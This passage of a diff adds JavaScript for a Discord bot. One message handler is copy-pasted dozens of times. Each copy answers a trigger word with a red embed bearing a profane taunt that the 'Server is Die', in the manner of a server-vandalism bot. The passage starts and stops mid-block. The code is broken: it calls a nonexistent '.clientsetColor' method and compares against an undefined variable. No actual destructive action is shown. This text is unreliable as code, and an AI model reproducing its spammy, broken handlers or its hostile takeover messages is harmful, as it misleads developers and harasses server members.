+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
+   .clientsetColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Surprize MOTHER FUCKER', "<@" + message.author.id + ">Server is Die")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+
+client.on('message', message => {
+ if (message.content === $hackerishere) {
+  const embed = new Discord.RichEmbed()
